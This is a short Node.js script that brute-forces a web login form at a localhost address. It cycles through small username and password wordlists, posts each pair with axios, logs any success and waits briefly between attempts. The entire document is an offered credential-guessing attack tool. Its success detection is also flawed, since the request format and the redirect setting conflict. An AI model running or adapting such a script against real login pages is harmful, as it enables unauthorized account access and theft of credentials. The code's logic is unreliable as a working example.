const axios = require('axios');

// Target login endpoint
const loginUrl = 'http://localhost:3000/';

// Sample wordlists (in reality, these would be much larger)
const usernames = ['admin', 'user', 'test'];
const passwords = ['password123', 'admin', '123456'];

// Function to attempt login
async function tryLogin(username, password) {
  try {
    const response = await axios.post(loginUrl, {
      username: username,
      password: password
    }, {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      // Prevent redirects to check raw response
      maxRedirects: 0
    });

    // Check if login succeeded (e.g., no error in URL or specific success indicator)
    const redirectUrl = response.request.res.responseUrl;
    if (!redirectUrl.includes('error')) {
      console.log(`Success! Username: ${username}, Password: ${password}`);
      return true;
    }
  } catch (error) {
    // Ignore errors like 403/400, just means login failed
    return false;
  }
}

// Brute-force loop
async function bruteForce() {
  for (const username of usernames) {
    for (const password of passwords) {
      console.log(`Trying ${username}:${password}`);
      const success = await tryLogin(username, password);
      if (success) return; // Stop on success
      await new Promise(resolve => setTimeout(resolve, 100)); // Basic delay
    }
  }
  console.log('Brute-force complete, no credentials found.');
}

bruteForce();